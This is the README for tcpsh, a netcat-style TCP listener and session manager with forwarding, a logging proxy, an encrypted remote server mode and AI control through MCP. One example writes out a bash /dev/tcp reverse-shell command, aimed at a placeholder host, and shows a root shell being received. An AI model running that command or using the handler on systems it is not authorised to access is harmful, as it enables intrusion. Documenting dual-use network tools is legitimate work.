# tcpsh — Interactive TCP Connection Manager

An advanced interactive TCP server and connection manager for network administrators and operators. Think `netcat` — but with a full REPL, multi-session management, port forwarding, TCP proxying, and persistent command history.

---

## Overview

`tcpsh` opens TCP listeners, accepts incoming connections, and lets you interact with each session directly from a readline-powered shell. It is primarily a **TCP server**: every flow begins with a local listener accepting an incoming connection.

Key differences from netcat:
- Manage **multiple ports and sessions simultaneously**
- **Stay in the REPL** — `Ctrl+C` never kills active connections
- **Forward** traffic transparently or **proxy** it with traffic logging
- Per-session and global **command history**
- Inline **notifications** when new connections arrive

---

## Requirements

- Go ≥ 1.21
- macOS, Linux, or any POSIX system

---

## Installation

```bash
git clone https://github.com/nchgroup/tcpsh tcpsh
cd tcpsh
go build -o tcpsh .
# optionally move to PATH
sudo mv tcpsh /usr/local/bin/
```

Or with `go install` (once published):
```bash
go install github.com/nchgroup/tcpsh@latest
```

---

## Quick Start

```
$ ./tcpsh

  _                 _
 | |_ ___ _ __  ___| |__
 | __/ __| '_ \/ __| '_ \
 | || (__| |_) \__ \ | | |
  \__\___| .__/|___/_| |_|
         |_|

tcpsh>
```

Open a port and wait for a connection:
```
tcpsh> open 4444
[+] Listening on 0.0.0.0:4444

# From another terminal:
# nc localhost 4444

[+] New connection on :4444 from 127.0.0.1:56321 (session 1)

tcpsh> use 4444
  Entering session 1 (127.0.0.1:56321). Type '+back' to return, ...
[4444:1]> hello
```

---

## Usage

### Opening a Port

```
tcpsh> open 4444
tcpsh> open 4444 127.0.0.1     # bind to specific interface
tcpsh> open 443 0.0.0.0        # explicit all-interfaces
```

### Listing Ports and Connections

```
tcpsh> list ports              # open listeners
tcpsh> list conn               # active sessions with TX/RX bytes
tcpsh> list all                # ports + sessions + forwards
tcpsh> list fwd                # active TCP forwards
tcpsh> list proxy              # active TCP proxies
```

### Interacting with a Session

```
tcpsh> use 4444                # attach (auto-select if only one session)
tcpsh> use 4444:2              # select session #2 on port 4444

[4444:1]> whoami               # sent directly to remote TCP connection
[4444:1]> ls -la               # raw passthrough
```

Use `+back` to return to the menu without closing the connection.

### Foreground / Background

| Command | Effect |
|---|---|
| `+back` | Return to menu, session stays active |
| `+bg` / `+background` | Send session to background |
| `use <port>:<idx>` | Re-attach to a background session |

### Port Forwarding

`fwd` creates a transparent pipe: incoming connections on `<local-port>` are piped to `<remote-host>:<remote-port>` with no modification and minimal overhead.

```
tcpsh> fwd 8080 10.0.0.1:80         # forward :8080 → 10.0.0.1:80
tcpsh> fwd list
tcpsh> fwd close 8080
```

### TCP Proxy (with logging)

`proxy` works like `fwd` but also logs intercepted traffic.

```
tcpsh> proxy 8080 10.0.0.1:80             # log to stdout
tcpsh> proxy 8080 10.0.0.1:80 /tmp/p.log # log to file
tcpsh> proxy log 8080 /tmp/new.log        # change log destination
tcpsh> proxy list
tcpsh> proxy close 8080
```

### Running Local Commands

Prefix any command with `!` to run it on the local system:

```
tcpsh> !ifconfig
tcpsh> !curl http://localhost:8080
[4444]> !id                    # also works in session mode
```

### Session History

Global history is saved to `~/.tcpsh_history` and persists between runs.

- **`↑` / `↓`** — navigate history
- **`Ctrl+R`** — reverse history search
- **`TAB`** — autocomplete commands

---

## Command Reference

### Listener & Session Management

| Command | Description |
|---|---|
| `open <port> [host]` | Open TCP listener |
| `close <port>` | Close listener and all its sessions |
| `kill <port>[:<idx>]` | Terminate connection (FIN), keep listener |
| `kill -f <port>[:<idx>]` | Force terminate (RST) |
| `use <port>[:<idx>]` | Attach to session in foreground |
| `send <port>[:<idx>] <data>` | Send data to a session (non-interactive) |
| `read <port>[:<idx>]` | Read and print buffered output from a session |
| `info <port>[:<idx>]` | Show session details and metrics |
| `list ports` | List open ports |
| `list conn` | List active sessions |
| `list all` | List everything |

### Forwarding & Proxy

| Command | Description |
|---|---|
| `fwd <lport> <host:rport>` | Start transparent TCP forward |
| `fwd list` | List active forwards |
| `fwd close <lport>` | Stop a forward |
| `proxy <lport> <host:rport> [file]` | Start TCP proxy with logging |
| `proxy list` | List active proxies |
| `proxy close <lport>` | Stop a proxy |
| `proxy log <lport> <file>` | Redirect proxy log to file |

### Other

| Command | Description |
|---|---|
| `help [cmd]` | General or per-command help |
| `clear` | Clear the terminal |
| `exit` / `+exit` | Exit tcpsh (prompts if sessions are active) |

---

## Special Commands (session mode)

| Command | Description |
|---|---|
| `+back` | Return to menu without closing connection |
| `+bg` / `+background` | Send session to background |
| `+exit` | Exit tcpsh |
| `!<cmd>` | Run a local system command |

---

## Configuration

Create `~/.tcpsh.yaml` to customise behaviour:

```yaml
prompt: "tcpsh> "
history_file: "~/.tcpsh_history"
history_size: 1000
dial_timeout: 10        # seconds for fwd/proxy dial
log_level: "info"       # debug | info | warn | error
quiet: false
```

---

## Signal Handling

| Signal | Behaviour |
|---|---|
| `Ctrl+C` (SIGINT) in menu | Prints a tip, does **not** exit |
| `Ctrl+C` (SIGINT) in session | Prints a tip, does **not** close TCP connection |
| `SIGTERM` | Graceful shutdown (closes listeners, prompts if sessions active) |

Active TCP connections are **never** dropped by a signal.

---

## Key Bindings

| Key | Action |
|---|---|
| `↑` / `↓` | Navigate command history |
| `Ctrl+R` | Reverse history search |
| `TAB` | Autocomplete commands and subcommands |
| `Ctrl+C` | Interrupt (safe — does not kill connections) |
| `Ctrl+L` | Clear screen (or use `clear`) |

---

## Examples

### Receive a reverse shell

```
tcpsh> open 4444
# Target: bash -i >& /dev/tcp/your-ip/4444 0>&1
[+] New connection on :4444 from 10.0.0.5:43210 (session 1)
tcpsh> use 4444
[4444:1]> id
uid=0(root) gid=0(root) groups=0(root)
[4444:1]> +back
tcpsh>
```

### Forward an internal service

```
# Expose an internal HTTP service on a reachable port
tcpsh> fwd 8080 192.168.1.100:80
[fwd] :8080  ──►  192.168.1.100:80
```

### Proxy with traffic logging

```
# Intercept and log all traffic through port 3306
tcpsh> proxy 3306 10.0.0.5:3306 /tmp/mysql.log
[proxy] :3306  ──►  10.0.0.5:3306
```

### Manage multiple background sessions

```
tcpsh> open 4444
tcpsh> open 4445
# multiple connections arrive
tcpsh> list conn
  ID     PORT     REMOTE                     STATE
  1      4444     10.0.0.2:50001             active
  2      4444     10.0.0.3:50002             active
  3      4445     10.0.0.4:50003             active

tcpsh> use 4444:1
[4444:1]> +bg
tcpsh> use 4444:2
[4444:2]>
```

---

## Modes

tcpsh ships with three runtime modes:

| Mode | Invocation | Description |
|---|---|---|
| **Console** | `tcpsh` (default) | Interactive REPL on the local terminal |
| **Server** | `tcpsh -server <bind:port>` | Headless daemon; accepts one encrypted CLI client |
| **Client** | `tcpsh -client <host:port>` | Connects to a running tcpsh server |

### Console mode (default)

```bash
tcpsh                      # start interactive REPL
tcpsh -port 4444           # open port 4444 immediately on startup
tcpsh -quiet               # suppress banner
```

### Server mode (`-server`)

Starts a headless daemon.  All traffic between server and client is encrypted
with **ChaCha20-Poly1305** (key = SHA-256 of the token).

```bash
# Auto-generate a random token (printed at startup)
tcpsh -server 0.0.0.0:9000
tcpsh -server 127.0.0.1:9000

# Hardcode a specific token via flag (must be exactly 32 [A-Za-z0-9] chars)
tcpsh -server 0.0.0.0:9000 -token MyHardcodedToken12345678901234

# Hardcode a specific token via environment variable
TCPSH_TOKEN=MyHardcodedToken12345678901234 tcpsh -server 0.0.0.0:9000
```

At startup the token box is rendered with proper proportions regardless of
the bind address length:

```
╭─────────────────────────────────────────────────────╮
│                                                     │
│   tcpsh server listening on 0.0.0.0:9000            │
│                                                     │
│   TOKEN  aBcDeFgHiJkLmNoPqRsTuVwXyZ012345           │
│                                                     │
│   Connect:                                          │
│     tcpsh -client 0.0.0.0:9000 -token <TOKEN>       │
│     TCPSH_TOKEN=<TOKEN> tcpsh -client 0.0.0.0:9000  │
│                                                     │
│   Keep this token secret — it encrypts all traffic. │
│                                                     │
╰─────────────────────────────────────────────────────╯
```

The server preserves all state (open ports, sessions, forwards) if the client
disconnects.  It accepts the next client connection without interruption.

### Client mode (`-client`)

Connects to a running tcpsh server.  The full command set is available exactly
as in console mode — commands are sent encrypted and responses are printed locally.

```bash
tcpsh -client 127.0.0.1:9000 -token aBcDeFgHiJkLmNoPqRsTuVwXyZ012345

# Token from environment variable (recommended for scripts):
export TCPSH_TOKEN=aBcDeFgHiJkLmNoPqRsTuVwXyZ012345
tcpsh -client 127.0.0.1:9000

# If -token is omitted and TCPSH_TOKEN is not set, tcpsh prompts interactively.
```

#### Token resolution priority

| Source | `-server` | `-client` |
|---|---|---|
| `-token <value>` flag | hardcode | authenticate |
| `TCPSH_TOKEN` env var | hardcode (fallback) | authenticate (fallback) |
| Interactive prompt | — (random token generated) | last resort |
| *(none)* | random token generated | error |

> **Security note:** The token must be exactly 32 characters from `[A-Za-z0-9]`.
> Treat it like a password — it derives the encryption key for all traffic.
>
> Flags use a single dash: `-server`, `-client`, `-token`, `-port`, `-quiet`.

---

## Contributing

1. Fork the repository
2. Create a feature branch
3. Run `go vet ./...` and `go test ./...` before submitting
4. Open a pull request

---

## MCP Integration

tcpsh can be controlled by any MCP-compatible AI host (Claude Desktop, VS Code Copilot, Cursor, etc.) via **[tcpsh-mcp](https://github.com/nchgroup/tcpsh-mcp)** — an MCP server that exposes all tcpsh capabilities as 13 AI-callable tools.

```json
{
  "mcpServers": {
    "tcpsh": {
      "command": "npx",
      "args": ["-y", "github:nchgroup/tcpsh-mcp"]
    }
  }
}
```

In **remote mode**, tcpsh-mcp connects to a running `tcpsh -server` instance over an encrypted channel, letting the AI manage TCP connections on a remote host:

```json
{
  "mcpServers": {
    "tcpsh-remote": {
      "command": "npx",
      "args": ["-y", "github:nchgroup/tcpsh-mcp"],
      "env": {
        "TCPSH_SERVER": "127.0.0.1:9000",
        "TCPSH_TOKEN": "<TOKEN>"
      }
    }
  }
}
```

See [github.com/nchgroup/tcpsh-mcp](https://github.com/nchgroup/tcpsh-mcp) for full documentation.

---

## License

MIT
